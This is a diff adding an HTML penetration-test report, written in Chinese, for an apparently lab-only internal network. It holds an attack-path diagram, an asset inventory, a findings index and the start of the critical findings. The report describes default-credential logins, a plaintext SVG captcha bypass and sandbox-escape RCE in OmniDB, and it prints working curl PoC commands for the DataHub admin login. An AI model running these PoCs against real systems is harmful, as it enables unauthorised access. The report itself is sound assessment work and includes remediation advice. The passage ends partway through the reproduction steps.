+      <marker id="am-arrow-hot" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+        <path d="M 0 1 L 9 5 L 0 9 z" fill="#c64545"/>
+      </marker>
+      <marker id="am-arrow-soft" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+        <path d="M 0 1 L 9 5 L 0 9 z" fill="#b8b0a4"/>
+      </marker>
+      <filter id="am-shadow" x="-12%" y="-12%" width="124%" height="140%">
+        <feDropShadow dx="0" dy="1.5" stdDeviation="2" flood-color="#141413" flood-opacity="0.07"/>
+      </filter>
+    </defs>
+
+    <!-- ===== curved trunks (图一风格) ===== -->
+    <g fill="none" stroke-width="1.7" marker-end="url(#am-arrow)">
+      <!-- portal -> DataHub -->
+      <path d="M 500 90 C 360 110, 220 130, 180 168" stroke="#cc785c"/>
+      <!-- portal -> docs -->
+      <path d="M 560 90 C 560 120, 560 140, 560 168" stroke="#cc785c"/>
+      <!-- portal -> host -->
+      <path d="M 620 90 C 760 110, 880 130, 920 168" stroke="#e8a55a"/>
+    </g>
+    <!-- docs -> gateway -->
+    <path d="M 560 230 C 560 250, 560 270, 560 292" fill="none" stroke="#5db8a6" stroke-width="1.5" marker-end="url(#am-arrow-soft)"/>
+    <!-- DataHub -> 139 (short, leftward, no overlap) -->
+    <path d="M 120 230 C 90 250, 70 270, 70 300" fill="none" stroke="#c9c2b8" stroke-width="1.4" stroke-dasharray="5 4" marker-end="url(#am-arrow-soft)"/>
+    <!-- DataHub -> OmniDB hot curve, routed through open middle-left corridor -->
+    <path d="M 220 230 C 260 280, 320 340, 520 390" fill="none" stroke="#c64545" stroke-width="1.8" marker-end="url(#am-arrow-hot)"/>
+    <!-- host -> service row (organic fan, long enough, spaced) -->
+    <g fill="none" stroke="#c9c2b8" stroke-width="1.35" marker-end="url(#am-arrow-soft)">
+      <path d="M 920 230 C 780 260, 700 300, 640 348"/>
+      <path d="M 940 230 C 900 270, 860 310, 820 348"/>
+      <path d="M 960 230 C 980 270, 1000 310, 1000 348"/>
+      <path d="M 920 230 C 760 300, 700 380, 640 448"/>
+      <path d="M 940 230 C 900 320, 860 400, 820 448"/>
+      <path d="M 960 230 C 1000 320, 1020 400, 1000 448"/>
+      <path d="M 940 230 C 940 360, 900 480, 820 528"/>
+    </g>
+    <!-- host -> main IP cluster -->
+    <path d="M 880 200 C 700 220, 420 300, 280 420" fill="none" stroke="#b8b0a4" stroke-width="1.35" stroke-dasharray="4 3" marker-end="url(#am-arrow-soft)"/>
+
+    <!-- edge labels in empty space -->
+    <g font-family="inherit" font-size="12" fill="#6c6a64">
+      <text x="280" y="120">JS 情报 / portals</text>
+      <text x="575" y="140" text-anchor="middle">同域扩展</text>
+      <text x="820" y="120">解析同机</text>
+      <text x="300" y="330" fill="#c64545">前端硬编码工具地址</text>
+      <text x="575" y="270" text-anchor="middle" fill="#5db8a6">网关 IP</text>
+      <text x="400" y="360" fill="#8e8b82">主站解析 IP</text>
+    </g>
+
+    <!-- ===== nodes ===== -->
+    <!-- L1 portal -->
+    <g filter="url(#am-shadow)">
+      <rect x="420" y="28" width="280" height="62" rx="14" fill="#181715"/>
+      <text x="560" y="52" text-anchor="middle" font-size="12" font-weight="700" fill="#cc785c">入口目标</text>
+      <text x="560" y="72" text-anchor="middle" font-size="15" font-weight="700" fill="#faf9f5">portal.lab.internal:443</text>
+    </g>
+
+    <!-- L2 -->
+    <g filter="url(#am-shadow)">
+      <rect x="70" y="168" width="220" height="62" rx="14" fill="#fffdf8" stroke="#c64545" stroke-width="1.8"/>
+      <text x="180" y="192" text-anchor="middle" font-size="12" font-weight="700" fill="#c64545">已破 · 数据中台</text>
+      <text x="180" y="212" text-anchor="middle" font-size="14" font-weight="700" fill="#141413">data.lab.internal:443</text>
+    </g>
+    <g filter="url(#am-shadow)">
+      <rect x="470" y="168" width="180" height="62" rx="14" fill="#fffdf8" stroke="#5db8a6" stroke-width="1.6"/>
+      <text x="560" y="192" text-anchor="middle" font-size="12" font-weight="700" fill="#5db8a6">文档站</text>
+      <text x="560" y="212" text-anchor="middle" font-size="14" font-weight="700" fill="#141413">docs.lab.internal</text>
+    </g>
+    <g filter="url(#am-shadow)">
+      <rect x="820" y="168" width="220" height="62" rx="14" fill="#fffdf8" stroke="#e8a55a" stroke-width="1.8"/>
+      <text x="930" y="192" text-anchor="middle" font-size="12" font-weight="700" fill="#c4842a">同机宿主</text>
+      <text x="930" y="212" text-anchor="middle" font-size="14" font-weight="700" fill="#141413">10.10.20.40</text>
+    </g>
+
+    <!-- under DataHub / food -->
+    <g filter="url(#am-shadow)">
+      <rect x="40" y="300" width="240" height="56" rx="12" fill="#f5f0e8" stroke="#e6dfd8"/>
+      <text x="160" y="322" text-anchor="middle" font-size="11" fill="#6c6a64">旁路地址（前端泄露）</text>
+      <text x="160" y="342" text-anchor="middle" font-size="12.5" fill="#3d3d3a">10.10.20.50 · SqlPad/TDengine</text>
+    </g>
+    <g filter="url(#am-shadow)">
+      <rect x="480" y="292" width="160" height="56" rx="12" fill="#fffdf8" stroke="#5db8a6"/>
+      <text x="560" y="314" text-anchor="middle" font-size="11" font-weight="700" fill="#5db8a6">边界网关</text>
+      <text x="560" y="334" text-anchor="middle" font-size="13" fill="#3d3d3a">10.10.20.60:80</text>
+    </g>
+
+    <!-- host services — wide spacing, no overlap -->
+    <g filter="url(#am-shadow)">
+      <rect x="560" y="348" width="160" height="58" rx="12" fill="#c64545"/>
+      <text x="640" y="372" text-anchor="middle" font-size="11" font-weight="700" fill="#ffd0d0">权限落地</text>
+      <text x="640" y="392" text-anchor="middle" font-size="13" font-weight="700" fill="#fff">OmniDB :8999</text>
+    </g>
+    <g filter="url(#am-shadow)">
+      <rect x="740" y="348" width="160" height="58" rx="12" fill="#fffdf8" stroke="#e6dfd8"/>
+      <text x="820" y="372" text-anchor="middle" font-size="11" font-weight="700" fill="#6c6a64">MinIO S3</text>
+      <text x="820" y="392" text-anchor="middle" font-size="13" fill="#3d3d3a">:9000</text>
+    </g>
+    <g filter="url(#am-shadow)">
+      <rect x="920" y="348" width="160" height="58" rx="12" fill="#fffdf8" stroke="#e6dfd8"/>
+      <text x="1000" y="372" text-anchor="middle" font-size="11" font-weight="700" fill="#6c6a64">AnnoApp</text>
+      <text x="1000" y="392" text-anchor="middle" font-size="13" fill="#3d3d3a">:10081</text>
+    </g>
+
+    <g filter="url(#am-shadow)">
+      <rect x="560" y="448" width="160" height="58" rx="12" fill="#fffdf8" stroke="#e6dfd8"/>
+      <text x="640" y="472" text-anchor="middle" font-size="11" font-weight="700" fill="#6c6a64">GitLab</text>
+      <text x="640" y="492" text-anchor="middle" font-size="13" fill="#3d3d3a">:13080</text>
+    </g>
+    <g filter="url(#am-shadow)">
+      <rect x="740" y="448" width="160" height="58" rx="12" fill="#fffdf8" stroke="#e6dfd8"/>
+      <text x="820" y="472" text-anchor="middle" font-size="11" font-weight="700" fill="#6c6a64">AppPortal 门户</text>
+      <text x="820" y="492" text-anchor="middle" font-size="13" fill="#3d3d3a">:10090</text>
+    </g>
+    <g filter="url(#am-shadow)">
+      <rect x="920" y="448" width="160" height="58" rx="12" fill="#fffdf8" stroke="#e8a55a"/>
+      <text x="1000" y="472" text-anchor="middle" font-size="11" font-weight="700" fill="#c4842a">GitLab</text>
+      <text x="1000" y="492" text-anchor="middle" font-size="13" fill="#3d3d3a">:10443</text>
+    </g>
+
+    <g filter="url(#am-shadow)">
+      <rect x="740" y="528" width="160" height="58" rx="12" fill="#fffdf8" stroke="#e6dfd8"/>
+      <text x="820" y="552" text-anchor="middle" font-size="11" font-weight="700" fill="#6c6a64">gunicorn 健康桩</text>
+      <text x="820" y="572" text-anchor="middle" font-size="13" fill="#3d3d3a">:8888</text>
+    </g>
+
+    <!-- main IP port cluster (left bottom, clear of curves) -->
+    <g filter="url(#am-shadow)">
+      <rect x="40" y="420" width="300" height="160" rx="14" fill="#fffdf8" stroke="#e6dfd8"/>
+      <text x="190" y="448" text-anchor="middle" font-size="12" font-weight="700" fill="#6c6a64">主站解析 IP · 10.10.20.10</text>
+      <text x="190" y="468" text-anchor="middle" font-size="11" fill="#8e8b82">4 个开放端口（服务节点分条登记）</text>
+      <rect x="58" y="486" width="120" height="36" rx="8" fill="#f5f0e8"/>
+      <text x="118" y="509" text-anchor="middle" font-size="12" fill="#3d3d3a">:80 HTTP</text>
+      <rect x="198" y="486" width="120" height="36" rx="8" fill="#f5f0e8"/>
+      <text x="258" y="509" text-anchor="middle" font-size="12" fill="#3d3d3a">:8080 HTTP</text>
+      <rect x="58" y="532" width="120" height="36" rx="8" fill="#f5f0e8"/>
+      <text x="118" y="555" text-anchor="middle" font-size="12" fill="#3d3d3a">:8443 HTTPS</text>
+      <rect x="198" y="532" width="120" height="36" rx="8" fill="#f5f0e8"/>
+      <text x="258" y="555" text-anchor="middle" font-size="12" fill="#3d3d3a">:8888 HTTP</text>
+    </g>
+  </svg>
+  <div class="am-legend">
+    <span><i style="background:#181715"></i>入口目标</span>
+    <span><i style="background:#c64545"></i>已破 / 权限落地</span>
+    <span><i style="background:#e8a55a"></i>同机宿主 / GitLab</span>
+    <span><i style="background:#5db8a6"></i>文档 / 网关</span>
+    <span><i style="background:#e6dfd8;border:1px solid #cfc7bb"></i>其它服务</span>
+  </div>
+
+  <h4 style="margin-top:18px">全部服务节点清单（22）</h4>
+  <p class="am-sub" style="margin-bottom:10px">与攻击图统计一致；同端点多次探测会形成多条节点，拓扑图已归并到独立资产，清单保持全量可见。</p>
+  <div class="am-svc-list">
+    <div class="am-item"><b>portal.lab.internal:443</b> 静态展示站（Lab Portal）<div class="k">含重复探测：portal-https / 443-static-lab / HTTPS-nginx 等</div></div>
+    <div class="am-item"><b>svc:443/http</b> Server（通用 HTTP 指纹）<div class="k">自动探测记录</div></div>
+    <div class="am-item"><b>www.portal.lab.internal:443</b> HTTP 443<div class="k">www 主机头探测</div></div>
+    <div class="am-item hot"><b>data.lab.internal:443</b> DataHub 数据中台（已破超级管理员）</div>
+    <div class="am-item"><b>docs.lab.internal:443</b> Docs 文档站（Read the Docs 风格）</div>
+    <div class="am-item"><b>10.10.20.60:80</b> 边界网关（范围内未深挖）</div>
+    <div class="am-item hot"><b>10.10.20.40:8999</b> OmniDB 3.0.3b（已破 admin + RCE）</div>
+    <div class="am-item"><b>10.10.20.40:9000</b> MinIO S3 API</div>
+    <div class="am-item"><b>10.10.20.40:10081</b> AnnoApp（源码树可读）<div class="k">含重复探测 2 条</div></div>
+    <div class="am-item"><b>10.10.20.40:13080</b> GitLab 19.1.1<div class="k">含重复探测 2 条</div></div>
+    <div class="am-item"><b>10.10.20.40:10090</b> AppPortal<div class="k">含重复探测 2 条</div></div>
+    <div class="am-item"><b>10.10.20.40:8888</b> gunicorn 健康桩（仅 ok）</div>
+    <div class="am-item"><b>git.lab.internal:10443</b> GitLab（开放注册）</div>
+    <div class="am-item"><b>10.10.20.10:80</b> HTTP 80</div>
+    <div class="am-item"><b>10.10.20.10:8080</b> HTTP 8080</div>
+    <div class="am-item"><b>10.10.20.10:8443</b> HTTP 8443</div>
+    <div class="am-item"><b>10.10.20.10:8888</b> HTTP 8888</div>
+    <div class="am-item"><b>10.10.20.50</b> 前端硬编码 SqlPad / OmniDB / TDengine 地址面</div>
+  </div>
+</div>
+
+<div class="assets">
+<div class="asset ">
+<div class="a-name">portal.lab.internal:443</div>
+<div class="a-role">示例内网靶场静态展示站（入口目标）</div>
+<div class="a-badges"><span class="chip teal">静态站</span><span class="chip high">README 泄露</span><span class="chip high">源码脚本暴露</span></div>
+<div class="a-desc">nginx/1.24.0 (Ubuntu) 纯静态站，HTML+JS 内容站。README.md（11741B）可匿名读，泄露站点目录结构与部署细节；optimize-assets.py 源码可下载；media/projects 演示视频直链；roster.js 泄露 若干成员邮箱；portals.js 泄露 12 个内部平台入口。</div>
+<div class="a-line">WAF：签名拦截敏感路径（.env/.sql/.bak 729B 拦截页），放行 .py/.js/.md</div>
+</div>
+<div class="asset danger">
+<div class="a-name">data.lab.internal:443</div>
+<div class="a-role">DataHub 数据中台（核心枢纽，已破超级管理员）</div>
+<div class="a-badges"><span class="chip crit">默认口令</span><span class="chip crit">越权</span><span class="chip high">XSS</span><span class="chip high">未授权读</span></div>
+<div class="a-desc">admin / lab-default → SuperAdmin（JWT UID=<redacted>）。验证码为 SVG 明文四位数字。/api/uploads/* 匿名可读（视频/HDF5/图片）。Regular 可执行 SuperAdmin 写操作（含删管理员）。/api/user/detail 回显密码 MD5。数据集 6、用户 2（admin, user_a）、角色 3。</div>
+<div class="a-line">前端 JS 写死 10.10.20.50:8998/8999/6060（SqlPad/OmniDB/TDengine）与 h5web 反代</div>
+</div>
+<div class="asset ">
+<div class="a-name">docs.lab.internal</div>
+<div class="a-role">Docs 文档站（Read the Docs 风格）</div>
+<div class="a-badges"><span class="chip teal">文档站</span></div>
+<div class="a-desc">302 → /en/latest/，IP 10.10.20.60；HTTP 走网关畸形跳转。文档站，非主 API 面。</div>
+<div class="a-line">IP 10.10.20.60 为边界网关（302 Location 拼坏，HTTPS 异常）</div>
+</div>
+<div class="asset warn">
+<div class="a-name">git.lab.internal:10443</div>
+<div class="a-role">GitLab（开放注册）</div>
+<div class="a-badges"><span class="chip high">开放注册</span><span class="chip high">匿名浏览</span></div>
+<div class="a-desc">解析至 10.10.20.40，与 GitLab 同机。注册页 200 开放注册；匿名 Explore 与 /api/v4/projects 可见 playground/sandbox 项目；SSH ssh://user@lab.internal:2222。</div>
+<div class="a-line">与实验室 GitLab 19.1.1（:13080）同宿主</div>
+</div>
+<div class="asset danger">
+<div class="a-name">10.10.20.40:8999</div>
+<div class="a-role">OmniDB 3.0.3b（服务器权限 终点）</div>
+<div class="a-badges"><span class="chip crit">默认口令</span><span class="chip crit">RCE</span><span class="chip crit">服务器权限</span></div>
+<div class="a-desc">默认口令 admin / admin 有效（sign_in 须 form data=JSON）。Monitoring test_monitor_script 的 RestrictedPython 沙箱仅禁 os，subprocess 可执行任意命令，已在容器内以 omnidb 用户（uid=101）执行 id，canary 落盘 static 目录并 HTTP 取回。</div>
+<div class="a-line">容器 Debian 10，hostname lab-node-01，pwd /home/omnidb/OmniDB/OmniDB</div>
+</div>
+<div class="asset ">
+<div class="a-name">10.10.20.40:9000</div>
+<div class="a-role">MinIO 对象存储（公网暴露）</div>
+<div class="a-badges"><span class="chip med">公网暴露</span><span class="chip med">AK 枚举</span></div>
+<div class="a-desc">S3 API 对公网可达，Region=shanghai；health/live 与 ready 200；控制台路径 AllAccessDisabled（未对公网开控制台）。SigV4 差分：minioadmin=InvalidAccessKeyId（不存在），admin 与 minio 两个 Access Key 存在（secret 未破）。匿名 ListBuckets AccessDenied。</div>
+<div class="a-line">非默认 minioadmin 凭据；未拉取对象、未爆破 secret</div>
+</div>
+<div class="asset warn">
+<div class="a-name">10.10.20.40:10081</div>
+<div class="a-role">AnnoApp 标注平台（源码泄露）</div>
+<div class="a-badges"><span class="chip high">源码泄露</span><span class="chip high">Docker 镜像泄露</span></div>
+<div class="a-desc">AppPortal 门户 config.js 指向该站。nginx 静态部署把 README、Dockerfile、compose、nginx.conf、docs 与 src/frontend|core 源码直接暴露；deliverables/docker/ 提供完整镜像归档（26,900,480B，sha256 校验一致，docker load 可用）。官方文档确认无后端 API，不成 RCE。</div>
+<div class="a-line">纯前端标注器，数据仅在浏览器本地处理；目录列表 403</div>
+</div>
+<div class="asset ">
+<div class="a-name">10.10.20.40:13080</div>
+<div class="a-role">GitLab 19.1.1 self-managed</div>
+<div class="a-badges"><span class="chip med">匿名 Explore</span></div>
+<div class="a-desc">与 GitLab 同机不同端口。snowplow hostname=gitlab_19.1.1:80；注册 /users/sign_up → 302 回登录（已关闭）；/explore 未登录 200；匿名 /api/v4/projects 空回复。</div>
+<div class="a-line">版本特征：GitLab 19.1.1 self-managed</div>
+</div>
+<div class="asset ">
+<div class="a-name">10.10.20.40:10090</div>
+<div class="a-role">AppPortal</div>
+<div class="a-badges"><span class="chip med">CORS *</span></div>
+<div class="a-desc">nginx 静态门户，HTTP 200，CORS *；assets/config.js 仅一块磁贴指向 10081 的 AnnoApp。无后端 API，路径乱打回 SPA HTML。</div>
+<div class="a-line">情报价值：指向 AnnoApp 的入口</div>
+</div>
+<div class="asset ">
+<div class="a-name">10.10.20.40:8888</div>
+<div class="a-role">gunicorn 健康桩</div>
+<div class="a-badges"><span class="chip teal">探活桩</span></div>
+<div class="a-desc">GET / → 200 text/html body=「ok」(2B)；其它路径 Flask/Werkzeug 风格 404；POST 405；OPTIONS 200 空。Host 换成 portal/sdc/food 均返回 ok。无登录面、无 JSON API、无 metrics。</div>
+<div class="a-line">疑似探活桩，非 SqlPad/Jupyter/TDengine 控制台</div>
+</div>
+<div class="asset ">
+<div class="a-name">10.10.20.10</div>
+<div class="a-role">主站 IP（80/8080/8443/8888）</div>
+<div class="a-badges"><span class="chip med">502</span></div>
+<div class="a-desc">portal.lab.internal 解析 IP。80/8080/8443/8888 全部 502；www.portal.lab.internal:443 亦 502。站库分离决策：未直连库口。</div>
+<div class="a-line">范围内 IP 10.10.20.10/143/160</div>
+</div>
+<div class="asset ">
+<div class="a-name">10.10.20.50</div>
+<div class="a-role">DataHub 前端硬编码数据库工具地址</div>
+<div class="a-badges"><span class="chip med">情报泄露</span></div>
+<div class="a-desc">DataHub 前端 JS 写死 fc=http://10.10.20.50:8998（SqlPad）、8999（OmniDB）、6060（TDengine）等数据库管理端口；另泄露需验证码的登录 API（缺 Captcha 即 400）。</div>
+<div class="a-line">纵深情报，支撑后续内网入口侦察</div>
+</div>
+</div>
+
+<!-- /SLOT:assets -->
+</section>
+<section class="sec" id="list">
+<div class="sec-head"><span class="num">05</span><h2>漏洞清单总表</h2><span class="en">Findings Index</span></div>
+
+<!-- SLOT:index-table -->
+<table class="tbl"><thead><tr><th style="width:56px">#</th><th style="width:90px">严重度</th><th>漏洞 / 发现</th><th style="width:120px">类型</th><th style="width:90px">状态</th><th style="width:64px">锚点</th></tr></thead><tbody><tr><td>1</td><td><span class="s-dot" style="background:var(--crit)"></span>严重</td><td>DataHub 默认口令 admin / lab-default 进入超级管理员</td><td>admin_access</td><td>已验证</td><td><a class="anchor" href="#vuln-f_3b92599aeb85">跳转</a></td></tr>
+<tr><td>2</td><td><span class="s-dot" style="background:var(--crit)"></span>严重</td><td>OmniDB 3.0.3b 默认口令 admin / admin 进入后台</td><td>admin_access</td><td>已验证</td><td><a class="anchor" href="#vuln-f_87c2cc7d635c">跳转</a></td></tr>
+<tr><td>3</td><td><span class="s-dot" style="background:var(--crit)"></span>严重</td><td>DataHub Regular 角色可执行 SuperAdmin 写操作（含删管理员）</td><td>privilege_escalation</td><td>已验证</td><td><a class="anchor" href="#vuln-f_c0af14cc0287">跳转</a></td></tr>
+<tr><td>4</td><td><span class="s-dot" style="background:var(--crit)"></span>严重</td><td>OmniDB Monitoring RestrictedPython 沙箱可 import subprocess（命令执行）<br><span style="color:var(--muted-soft);font-size:12px">node:vuln:omnidb-restrictedpython-rce</span></td><td>rce</td><td>节点级</td><td><a class="anchor" href="#vuln-node:vuln:omnidb-restrictedpython-rce">跳转</a></td></tr>
+<tr><td>5</td><td><span class="s-dot" style="background:var(--crit)"></span>严重</td><td>服务器权限 (omnidb)：OmniDB RestrictedPython 沙箱执行系统命令</td><td>rce</td><td>已验证</td><td><a class="anchor" href="#vuln-f_c89738ca8884">跳转</a></td></tr>
+<tr><td>6</td><td><span class="s-dot" style="background:var(--high)"></span>高危</td><td>DataHub 上传目录未授权可读（含 HDF5）</td><td>unauth</td><td>已验证</td><td><a class="anchor" href="#vuln-f_59b55f20c8bf">跳转</a></td></tr>
+<tr><td>7</td><td><span class="s-dot" style="background:var(--high)"></span>高危</td><td>DataHub 登录后可上传文件且未授权可读回（txt canary）</td><td>file_upload</td><td>已验证</td><td><a class="anchor" href="#vuln-f_53ab480c47e5">跳转</a></td></tr>
+<tr><td>8</td><td><span class="s-dot" style="background:var(--high)"></span>高危</td><td>DataHub 存储型 SVG XSS（上传后未授权以 image/svg+xml 回读）</td><td>xss</td><td>已验证</td><td><a class="anchor" href="#vuln-f_694ed9836e75">跳转</a></td></tr>
+<tr><td>9</td><td><span class="s-dot" style="background:var(--high)"></span>高危</td><td>DataHub 车载环视视频未授权可下载（/api/uploads/video/*）</td><td>unauth</td><td>已验证</td><td><a class="anchor" href="#vuln-f_6cd64daa6622">跳转</a></td></tr>
+<tr><td>10</td><td><span class="s-dot" style="background:var(--high)"></span>高危</td><td>DataHub 用户详情接口回显密码 MD5</td><td>sensitive_data_exposure</td><td>已验证</td><td><a class="anchor" href="#vuln-f_51e9b2e84111">跳转</a></td></tr>
+<tr><td>11</td><td><span class="s-dot" style="background:var(--high)"></span>高危</td><td>AnnoApp(10.10.20.40:10081) 源码/Docker/文档未授权可读</td><td>source_leak</td><td>已验证</td><td><a class="anchor" href="#vuln-f_cffac6633b7b">跳转</a></td></tr>
+<tr><td>12</td><td><span class="s-dot" style="background:var(--high)"></span>高危</td><td>AnnoApp Docker 镜像归档可完整下载且哈希校验通过</td><td>source_leak</td><td>待复验</td><td><a class="anchor" href="#vuln-f_a0fd8f62f328">跳转</a></td></tr>
+<tr><td>13</td><td><span class="s-dot" style="background:var(--high)"></span>高危</td><td>GitLab 开放注册且匿名可浏览项目</td><td>unauth</td><td>已验证</td><td><a class="anchor" href="#vuln-f_cef2eb60a90c">跳转</a></td></tr>
+<tr><td>14</td><td><span class="s-dot" style="background:var(--muted-soft)"></span>中危</td><td>前端 JS 公开泄露内部平台端点清单（含实验室 Gitlab/代码托管/内网内部系统）</td><td>info_disclosure</td><td>已验证</td><td><a class="anchor" href="#vuln-f_6ddcec424f32">跳转</a></td></tr>
+<tr><td>15</td><td><span class="s-dot" style="background:var(--muted-soft)"></span>中危</td><td>人员名录脚本公开若干内部邮箱（已脱敏）</td><td>info_disclosure</td><td>已验证</td><td><a class="anchor" href="#vuln-f_c0a800a4fb3d">跳转</a></td></tr>
+<tr><td>16</td><td><span class="s-dot" style="background:var(--muted-soft)"></span>中危</td><td>media/projects 演示视频可直链下载（约 180MB）</td><td>info_disclosure</td><td>已验证</td><td><a class="anchor" href="#vuln-f_de1fd5cec3dc">跳转</a></td></tr>
+<tr><td>17</td><td><span class="s-dot" style="background:var(--muted-soft)"></span>中危</td><td>DataHub 前端泄露 SqlPad/OmniDB/TDengine 及需验证码的登录 API</td><td>info_disclosure</td><td>已验证</td><td><a class="anchor" href="#vuln-f_fdc0f776f759">跳转</a></td></tr>
+<tr><td>18</td><td><span class="s-dot" style="background:var(--muted-soft)"></span>中危</td><td>OmniDB 3.0.3b 登录页对公网开放（sign_in 500，未进库）</td><td>info</td><td>已验证</td><td><a class="anchor" href="#vuln-f_7429b8bd9cdf">跳转</a></td></tr>
+<tr><td>19</td><td><span class="s-dot" style="background:var(--muted-soft)"></span>中危</td><td>10.10.20.40:9000 MinIO 对公网暴露（匿名无 ListBuckets）</td><td>info</td><td>已验证</td><td><a class="anchor" href="#vuln-f_ff48e38e1ad8">跳转</a></td></tr>
+<tr><td>20</td><td><span class="s-dot" style="background:var(--muted-soft)"></span>中危</td><td>MinIO 存在 Access Key Id admin 与 minio（secret 未破）</td><td>info</td><td>已验证</td><td><a class="anchor" href="#vuln-f_afe41942edad">跳转</a></td></tr>
+<tr><td>21</td><td><span class="s-dot" style="background:var(--muted-soft)"></span>中危</td><td>optimize-assets.py 源码可直接下载（部署目录暴露）<br><span style="color:var(--muted-soft);font-size:12px">node:vuln:optimize-assets-py-leak</span></td><td>vuln</td><td>节点级</td><td><a class="anchor" href="#vuln-node:vuln:optimize-assets-py-leak">跳转</a></td></tr>
+<tr><td>22</td><td><span class="s-dot" style="background:var(--muted)"></span>低危</td><td>部署目录脚本源码任意下载（optimize-assets.py，未授权文件读）</td><td>info_disclosure</td><td>已验证</td><td><a class="anchor" href="#vuln-f_829d22a32949">跳转</a></td></tr>
+<tr><td>23</td><td><span class="s-dot" style="background:var(--muted)"></span>低危</td><td>部署目录配置枚举穷尽：零密钥命中（read_to_creds 关闭）<br><span style="color:var(--muted-soft);font-size:12px">node:vuln:deploy-dir-config-enum</span></td><td>vuln</td><td>节点级</td><td><a class="anchor" href="#vuln-node:vuln:deploy-dir-config-enum">跳转</a></td></tr>
+</tbody></table>
+<!-- /SLOT:index-table -->
+</section>
+<section class="sec" id="critical">
+<div class="sec-head"><span class="num">06</span><h2>严重漏洞（Critical · 5 项）</h2><span class="en">Critical Findings — 简介 / 利用 / 修复 全文</span></div>
+
+<!-- SLOT:findings-critical -->
+<p class="sec-sub">严重项共 5 项，全部与「默认口令 / 弱口令 + 缺失服务端鉴权 / 沙箱缺陷」直接相关，均已完成验证或形成节点级记录；每一项均附证据与复现路径。</p>
+<article class="vf crit" id="vuln-f_3b92599aeb85">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip crit">严重</span><h3>DataHub 默认口令 admin / lab-default 进入超级管理员</h3></div>
+<div class="vmeta">
+<span>类型 admin_access</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span>
+</div></div>
+<div class="vbody">
+<div class="vsec"><h4><span class="tick">①</span> 简介 / 技术成因</h4>
+<p>DataHub 数据中台（data.lab.internal）的登录防护存在两个可叠加缺陷：① 验证码接口 /api/auth/captcha 直接返回 SVG 明文四位数字，脚本一行 sed 即可解析，验证码形同虚设；② 默认口令 admin / lab-default 未修改。两者叠加使「自动化登录超级管理员」完全可行。</p>
+<p>登录成功：POST /api/auth/login → code=0 + accessToken（JWT，UID=<redacted>，角色 SuperAdmin）。随后 GET /api/user/detail → username=admin、roles=[{code:SuperAdmin}]；GET /api/user → total=2（admin, user_a）；GET /api/dataset/count → 6。即全站用户、角色、数据集、上传文件清单均可读取（未改业务数据、未灌库）。</p>
+<p>关联性：本条为攻击链核心枢纽 —— SuperAdmin 会话后续支撑上传+未授权读、SVG XSS、垂直越权差分、密码哈希回显，并最终通过前端硬编码的数据库工具入口导向 OmniDB 命令执行。</p>
+</div>
+<div class="vsec"><h4><span class="tick">②</span> 利用方式（编号分步复现）</h4><ol>
+<li>解析验证码（SVG 明文四位数字）：</li>
+<li>登录（携带 Cookie 罐保持会话）：</li>
+<li>验证角色：GET /api/user/detail → roles=[{code:SuperAdmin}]；GET /api/user → total=2。</li>
+</ol>
+<pre>CAPTCHA=$(curl -skc /tmp/lab.jar -b /tmp/lab.jar https://data.lab.internal/api/auth/captcha \
+ | sed -n &#x27;s/.*&gt;\([0-9]\{4\}\)&lt;.*/\1/p&#x27;)
+curl -sk -b /tmp/lab.jar -H &#x27;Content-Type: application/json&#x27; \
+ -d &quot;{\&quot;username\&quot;:\&quot;admin\&quot;,\&quot;password\&quot;:\&quot;lab-default\&quot;,\&quot;captcha\&quot;:\&quot;$CAPTCHA\&quot;,\&quot;isQuick\&quot;:false}&quot; \
+ https://data.lab.internal/api/auth/login
+# 预期 code=0 + accessToken（JWT UID=<redacted>, SuperAdmin）
+# 后续：curl -sk -H &quot;Authorization: Bearer $TOKEN&quot; https://data.lab.internal/api/user/detail</pre>
+<p style="font-size:13px;color:var(--muted)"><b>前置条件：</b>攻击前置条件见验证证据、PoC 与关联节点。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick g">③</span> 修复方式</h4><div class="fix-grid">
+<div class="fix-box"><h5 class="now">⚠ 立即缓解</h5><ul>
+<li>立即修改 admin 默认口令为强口令，并对全站账号做弱口令排查（联动密码 MD5 回显可离线比对）。</li>
+<li>修复验证码：服务端会话绑定、不可从接口直接读出明文（图形混淆/行为验证/图片验证码）。</li>
+<li>对 /api/auth/login 增加登录失败次数限制与账号锁定；评估对公网做来源限制。</li>
+</ul></div>
+<div class="fix-box"><h5 class="root">✔ 根治</h5><ul>
+<li>口令策略落地：复杂度 + 有效期 + 首次登录强制改密；定期弱口令扫描纳入运维基线。</li>
+<li>验证码服务端强校验，任何客户端可见的「答案字段」必须移除。</li>
+<li>敏感接口最小暴露：user/detail、role/page 等按需返回字段（联动脱敏）。</li>
+<li>登录行为审计 + 异常（同源高频登录）告警。</li>
+</ul></div></div>
+</div>
+<details class="ev"><summary>证据 / PoC 复现（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>POST /api/auth/login → code=0 accessToken；GET /api/user/detail → username=admin roles=[{code:SuperAdmin}]；GET /api/user → total=2 (admin, user_a)；GET /api/dataset/count → 6。</span></div>
+<div class="row"><span class="k">验证细节</span><span>SuperAdmin user/detail + dataset count=6 + user total=2；线上复验 HTTP 200（GET /api/user/detail）。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono"><a href="https://data.lab.internal/api/user/detail" target="_blank" rel="noopener">https://data.lab.internal/api/user/detail</a></span></div>
+<div class="row"><span class="k">PoC curl</span></div><pre>CAPTCHA=$(curl -skc /tmp/lab.jar -b /tmp/lab.jar https://data.lab.internal/api/auth/captcha | sed -n &#x27;s/.*&gt;\([0-9]\{4\}\)&lt;.*/\1/p&#x27;); curl -sk -b /tmp/lab.jar -H &#x27;Content-Type: application/json&#x27; -d &quot;{\&quot;username\&quot;:\&quot;admin\&quot;,\&quot;password\&quot;:\&quot;lab-default\&quot;,\&quot;captcha\&quot;:\&quot;$CAPTCHA\&quot;,\&quot;isQuick\&quot;:false}&quot; https://data.lab.internal/api/auth/login</pre>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
